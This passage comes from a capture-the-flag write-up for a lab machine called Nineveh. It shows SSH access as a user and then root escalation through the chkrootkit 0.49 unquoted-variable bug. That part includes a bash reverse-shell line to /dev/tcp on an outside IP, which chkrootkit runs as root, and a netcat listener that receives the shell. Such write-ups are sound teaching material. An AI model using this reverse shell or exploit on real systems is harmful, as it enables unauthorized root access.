Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.

You have mail.                                                                                                                                                                                          
Last login: Wed Apr 22 05:34:21 2020 from 10.10.14.24                                                                                                                                                    
amrois@nineveh:~$

```

It loops over the three ports, and for each scans Nineveh with `nmap` using a short timeout and no retries, directing the output to `/dev/null`. Then it connects with SSH.

I can also grab `user.txt`:

```

amrois@nineveh:~$ cat user.txt
82a864f9************************

```

### Shortcut - SSH from localhost

On first solving, I didn’t look for `knockd`, but rather, I just made a copy of the private key in `/dev/shm` on Nineveh.

```

www-data@nineveh:/dev/shm$ chmod 600 .id_rsa
www-data@nineveh:/dev/shm$ ssh -i .id_rsa amrois@10.10.10.43
Could not create directory '/var/www/.ssh'. 
The authenticity of host '10.10.10.43 (10.10.10.43)' can't be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

133 packages can be updated.
66 updates are security updates.

You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$

```

## Priv: amrois –> root

### Enumeration

After not finding much with [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), I noticed an unusual folder in the system root, `/report`. It contained text files that were dated right now:

```

amrois@nineveh:/report$ ls -la
total 32
drwxr-xr-x  2 amrois amrois 4096 Apr 11 14:12 .
drwxr-xr-x 24 root   root   4096 Jul  2  2017 ..
-rw-r--r--  1 amrois amrois 4799 Apr 11 14:10 report-20-04-11:14:10.txt
-rw-r--r--  1 amrois amrois 4799 Apr 11 14:11 report-20-04-11:14:11.txt
-rw-r--r--  1 root   root   4384 Apr 11 14:12 report-20-04-11:14:12.txt
amrois@nineveh:/report$ date
Sat Apr 11 14:12:09 CDT 2020

```

The reports are looking for changes to common executables and for odd files:

```

amrois@nineveh:/report$ cat report-20-04-11:14:12.txt                                 
ROOTDIR is `/'                                                                        
Checking `amd'... not found                                                           
Checking `basename'... not infected                                                   
Checking `biff'... not found                                                          
Checking `chfn'... not infected                                                       
Checking `chsh'... not infected                                                       
Checking `cron'... not infected                                                       
Checking `crontab'... not infected
...[snip]...
Checking `aliens'... 
/dev/shm/pspy64
Searching for sniffer's logs, it may take a while... nothing found
Searching for HiDrootkit's default dir... nothing found
Searching for t0rn's default files and dirs... nothing found
Searching for t0rn's v8 defaults... nothing found
Searching for Lion Worm default files and dirs... nothing found
Searching for RSHA's default files and dir... nothing found
Searching for RH-Sharpe's default files... nothing found
Searching for Ambient's rootkit (ark) default files and dirs... nothing found
Searching for suspicious files and dirs, it may take a while... 
/lib/modules/4.4.0-62-generic/vdso/.build-id
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found
Searching for Maniac files and dirs... nothing found
...[snip]...
Searching for suspect PHP files... 
/var/tmp/0xdf.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' file size is zero
Checking `asp'... not infected
...[snip]...

```

Interestingly, it did identify my webshell.

I uploaded and ran [pspy](https://github.com/DominicBreuker/pspy), and each minute, there’s a flurry of activity, with many of the processes referencing `/usr/bin/chkrootkit` . [chkrootkit](http://www.chkrootkit.org/) is a tool that will check a host for for signs of a rootkit.

### chkroot Exploit

Fortunately for me, there’s an exploit against `chkrootkit`:

```

root@kali# searchsploit chkrootkit
---------------------------------------------------- ----------------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
---------------------------------------------------- ----------------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit | exploits/linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation        | exploits/linux/local/33899.txt
---------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

The `txt` file says that any file in `$SLAPPER_FILES` will run due to a typo because of this loop:

```

   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi

```

The intended behavior is to set `$file_port` to be equal to `"$file_port $i"`. But because the `""` are missing, `bash` will treat that as setting `file_port=$file_port` and then running `$i`.

`$SLAPPER_FILES` is set a few lines earlier:

```

   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a

```

### Shell

I’ll write a simple reverse shell to `/tmp/update` and make it executable:

```

amrois@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1'
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.24/443 0>&1
amrois@nineveh:/tmp$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.24/443 0>&1' > update
amrois@nineveh:/tmp$ chmod +x update

```

The next time `chkroot` runs, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.43.
Ncat: Connection from 10.10.10.43:44006.
bash: cannot set terminal process group (11510): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~#

```

And I can grab the flag:

```

root@nineveh:~# cat root.txt
8a2b4956************************

```